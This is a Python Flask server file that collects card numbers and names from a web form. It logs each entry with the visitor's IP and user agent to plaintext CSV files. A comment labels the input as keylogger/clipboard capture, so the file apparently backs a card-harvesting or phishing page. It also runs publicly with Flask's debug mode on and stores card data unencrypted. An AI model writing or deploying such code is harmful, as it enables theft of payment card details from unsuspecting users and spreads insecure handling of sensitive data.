import os
from flask import Flask, render_template, request, redirect, url_for
import pandas as pd
from datetime import datetime
import uuid
import logging


# --- CONFIGURATION ---
app = Flask(__name__)
LOG_DIR = "Session_Logs"
os.makedirs(LOG_DIR, exist_ok=True)

# *** CRITICAL FIX: Define the state globally ***
# Initialize the state container at the module level
session_data = {} 
# --- END FIX ---

# Setup logging for internal server errors... (Keep this as is)

# --- CORE LOGIC ---
def get_session_info(request):
    # ... (Function body remains the same)
    visitor_ip = request.remote_addr 
    user_agent = request.headers.get('User-Agent', 'Unknown_Device')
    return visitor_ip, user_agent

@app.route('/')
def index():
    # The global session_data is now immediately available here
    return render_template('index.html', session_info=session_data)

@app.route('/submit', methods=['POST'])
def submit_form():
    global session_data # <-- IMPORTANT: Declare that this function intends to modify the global variable



        # 1. Capture User Input (The Keylogger/Clipboard input)
    card_number = request.form.get('card_number')
    name = request.form.get('name')



    # 2. Capture Context
    visitor_ip, user_agent = get_session_info(request)

    # 3. Update Session Data - PROTECTION LAYER ADDED HERE
    if 'submission_data' not in session_data:
        session_data['submission_data'] = {} # <-- THIS IS THE NEW LINE THAT CREATES THE SUB-FOLDER

    session_data['submission_data']['card_number'] = card_number
    session_data['submission_data']['name'] = name
    session_data['submission_data']['user_agent'] = user_agent

    # 4. Final Logging/Saving Mechanism
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_id = str(uuid.uuid4())[:10] 

    # --- TEMPORARILY SAVE THE DATA IF WE DON'T WANT TO KEEP IT in memory ---
    # (This ensures the data is saved even if the server crashes)
    log_filename = os.path.join(LOG_DIR, f"{session_id}_{timestamp}_session_log.csv")

    data_to_save = {
        'SessionID': session_id,
        'Timestamp': timestamp,
        'VisitorIP': visitor_ip,
        'CardNumber': card_number,
        'Name': name,
        'UserAgent': user_agent
    }
    df = pd.DataFrame([data_to_save])
    df.to_csv(log_filename, index=False)

    # --- Clean up the global in-memory state ---
    # If you want the session_data to ONLY reflect the LATEST entry, clear it:
    session_data = {} 

    print("=========================================================")
    print(f"✅ SUCCESS: Session logged! File created: {log_filename}")
    print("=========================================================")

    return redirect(url_for('index'))

if __name__ == '__main__':
    # Run the server on a specific port, accessible by clients
    app.run(host='0.0.0.0', port=80, debug=True) 
